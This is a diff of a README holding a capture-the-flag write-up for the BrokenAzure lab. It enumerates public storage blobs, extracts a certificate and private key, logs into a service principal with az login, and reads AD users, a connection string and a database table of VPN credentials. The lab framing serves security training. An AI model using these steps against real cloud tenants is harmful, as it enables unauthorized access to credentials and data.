@@ -6,33 +6,53 @@ This repository contains a detailed write-up for a challenge found on [BrokenAzu
 
 The company named SuperCompany B.V. has been working with IT systems for a while now and have an IT team of a whoppin' 2 people. Because the CEO of the company has heard that 'Cloud' is the new way of working, the CEO has asked the IT team to migrate all IT systems to the Azure cloud platform. Sadly, management does not allow the IT team to take courses or trainings to learn more about Azure cloud and so they have to learn as-they-go
 <br>
+
 ## Scripts
+
+<br>
+
 These scripts are found in my github folder, Tools
 ```bash
 https://github.com/Snoozekinezzar/Tools.git
 ```
+
 <br>
 
 # Challenge 1
+
 <br>
 
 ## Tools Utilized
 
+<br>
+
 **enumerate_containers.py** : A script designed for enumerating accessible storage containers within a given Azure Storage account.
 **list_blobs_info.py** : A script aimed at listing details about blobs within a specific container, including file names, sizes, and modification timestamps.
 
+<br>
+
 ## Developer tools
+
+<br>
 
 By refreshing the page, it is shown in the security pane, that the Azure account name is **supercompanystorage**
 ```bash
 https://supercompanystorage.blob.core.windows.net
 ```
 
+<br>
+
 ## Procedure and Discoveries
+
+<br>
 
 ### Enumerating Storage Containers
 
+<br>
+
 The first step involved using the `enumerate_containers.py` script to enumerate storage containers within the `supercompanystorage` account, as showcased below:
+
+<br>
 
 ```bash
 ┌──(brokenazure㉿ctf)-[~/Github/Tools]
@@ -41,8 +61,16 @@ Enter the Azure Storage account name: supercompanystorage
 Container found: storagecontainer
 Found Containers: ['storagecontainer']
 ```
+
+<br>
+
 ### Output:
+
+<br>
+
 Upon identifying the container name (storagecontainer), the `list_blobs_info.py` script was executed to enumerate blobs within this container. This process revealed the names, sizes, and last modified dates of the blobs:
+
+<br>
 
 ```bash
 ┌──(brokenazure㉿ctf)-[~/Github/Tools]
@@ -53,6 +81,8 @@ List of blobs:
 - Name: SECURA{C3RT1F1C3T3}.pem, Size: 3002 bytes, Last Modified: Mon, 08 Aug 2022 11:08:05 GMT
 - Name: logo.png, Size: 10763 bytes, Last Modified: Mon, 08 Aug 2022 11:08:05 GMT
 ```
+
+<br>
 
 ## Uncovered Flags
 This investigative effort led to the identification of several files, one of which contained a flag:
@@ -69,14 +99,21 @@ This flag was located within the file named SECURA{C3RT1F1C3T3}.pem, marking a s
 <br>
 
 # Challenge 2
+
 <br>
 
 ## Tools Utilized
 
+<br>
+
 **blob_activator.py**: A script for reading individual blobs within a given Azure Storage account.
+
+<br>
 
 ## Accessing blobs
 The next step involved using the `blob_activator.py` script to access the information inside the blobs I've previously listed using my `list_blobs_info.py`, as showcased below:
+
+<br>
 
 ```bash
 ┌──(brokenazure㉿ctf)-[~/Github/Tools]
@@ -86,8 +123,15 @@ Enter the container name: storagecontainer
 Enter the blob name: SECURA{C3RT1F1C3T3}.pem
 ```
 
+<br>
+
 ### Output:
+
+<br>
+
 Using the `blob_activator.py`, I was able to access the Privacy Enhanced Mail file (.pem), *SECURA{C3RT1F1C3T3}.pem*, which contained **certificate**, **private key**, **tenant id** and **application id**.
+
+<br>
 
 ```bash
 -----BEGIN CERTIFICATE-----
@@ -143,15 +187,24 @@ App-id: b2bfb506-aead-40d8-9e93-6f3e5d752826
 -----END AZURE_DETAILS-----
 ```
 
+<br>
+
 ## Writing to .pem file and az ad commands
 Now that I have the *certificate*, *private key* I can create my own *.pem file*.
 Together with *tenant id* and *app-id*, I can use az login to access the service principal, but without the subscription (It should be noted that tenant id and app id is usually not in .pem files)
+
+<br>
 
 ```bash
 az login --service-principal -u b2bfb506-aead-40d8-9e93-6f3e5d752826 --tenant 4452edfd-a89d-43aa-8b46-a314c219cc50 --password brokenazure.pem --allow-no-subscriptions
 ```
 
+<br>
+
 ### Output:
+
+<br>
+
 ```bash
 ┌──┌──(brokenazure㉿ctf)
 └─$ az login --service-principal -u b2bfb506-aead-40d8-9e93-6f3e5d752826 --tenant 4452edfd-a89d-43aa-8b46-a314c219cc50 --password brokenazure.pem --allow-no-subscriptions
@@ -176,8 +229,12 @@ When running the user list command, I find a list of AD users
 az ad user list
 ```
 
+<br>
 
 ### Output:
+
+<br>
+
 ```bash
 ┌──┌──(brokenazure㉿ctf)
 └─$ az ad user list
@@ -245,18 +302,29 @@ I found the second flag in `officeLocation` in the user `DevOps`:
 <br>
 
 # Challenge 3
+
 <br>
 
 ## Accessing Azure FunctionApp
+
+<br>
+
 By this the **az functionapp function show** I can access the information inside the functionapp.
+
+<br>
 
 ### Output:
 `Abbreviated output`
+
+<br>
+
 ```bash
 ┌──┌──(brokenazure㉿ctf)
 └─$ az functionapp function show
 return new OkObjectResult("Server=tcp:secureavulnerableserver.database.windows.net,1433;Initial Catalog=securavulnerabledb;Persist Security Info=False;User ID=DevOps;Password=SECURA{C0NN3CT10N_STR1NG};MultipleActiveResultSets=False;Encrypt=True
 ```
+
+<br>
 
 The third flag was inside the `return new OkObjectResult`.
 
@@ -267,28 +335,44 @@ The third flag was inside the `return new OkObjectResult`.
 <br>
 
 # Challenge 4
+
 <br>
 
 ## Tools Utilized
 
+<br>
+
 **database_connector.py**: A script for accessing databases and tables (an alternative to SQLCMD).
 
+<br>
+
 ## Network mapper
+
+<br>
+
 As I could see in the `OkObjectResult`, there is a database I possibly could access, `secureavulnerableserver.database.windows.net`.
 I therefor ran a Nmap scan to see if I could get a hit.
+
 <br>
+
 It is possible to try different ports related to databases (this is standard/non-configured ports):
+
 <br>
+
 `MySQL: 3306`
-<br>
+
 `Oracle DB: 1521, 1830`
-<br>
+
 `PostgreSQL: 5432`
-<br>
+
 `SQL Server (MSSQL): 1433, 1434`
+
 <br>
 
 ### Output:
+
+<br>
+
 ```bash
 ┌──┌──(brokenazure㉿ctf)
 └─$ nmap securavulnerableserver.database.windows.net -p 1433
@@ -301,6 +385,7 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds
 ```
+
 <br>
 
 As shown above, the host is up on port: `1433`, which means `SQL Server (MSSQL)`.
@@ -308,9 +393,17 @@ As shown above, the host is up on port: `1433`, which means `SQL Server (MSSQL)`
 <br>
 
 ## Accessing database and tables
+
+<br>
+
 By running `database_connector.py` I could access the database and the tables (I first had to install the driver for SQL Server), using the information I already gathered, together with the database name found in `return new OkObjectResult` under `Initial Catalog`.
 
+<br>
+
 ### Output:
+
+<br>
+
 ```
 ┌──┌──(brokenazure㉿ctf)
 └─$ ./database_connector.py
@@ -332,6 +425,8 @@ Enter SQL command: select * from vpn_employee_data
 ('Employee23187', 'SECURA{VPN_CR3D3NT14L$}',)
 ```
 
+<br>
+
 The fourth flag was inside the table `vpn_employee_data`.
 
 <br>
@@ -341,6 +436,7 @@ The fourth flag was inside the table `vpn_employee_data`.
 <br>
 
 # Challenge 5
+
 <br>
 
 After trying a lot of different approaches with the information above, I was not able to access further information.
@@ -352,9 +448,16 @@ In reading other writeups, I found a website which show the following:
 *10.1.2.4*
 *10.1.2.5*
 
+<br>
+
 After trying Nmap to check the IPs I could see the host is not up anymore:
 
+<br>
+
 ### Output:
+
+<br>
+
 ```bash
 ┌──┌──(brokenazure㉿ctf)
 └─$ nmap 10.1.2.4 10.1.2.5
@@ -362,7 +465,9 @@ Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 09:58 UTC
 Nmap done: 2 IP addresses (0 hosts up) scanned in 3.04 seconds
 ```
 
-I will then type out the result of the last flag from the website I found to complete the challenge.
+<br>
+
+I will then type out the result of the last flag from the website I found, to complete the challenge.
 
 <br>
 
@@ -372,10 +477,15 @@ I will then type out the result of the last flag from the website I found to com
 
 Here is the website from Trevor Steen which helped me get the last flag:
 
+<br>
+
 > [BrokenAzure]([https://github.com/NetSPI/MicroBurst](https://ratil.life/broken-azure/))
 
 <br>
 <br>
 
 ## Conclusion
+
+<br>
+
 The challenge underscored the critical need for securing Azure storage accounts and containers against unauthorized access. The successful enumeration and extraction of data from inadequately secured containers highlighted potential vulnerabilities, reinforcing the importance of ethical hacking practices and proper authorization prior to conducting vulnerability assessments.
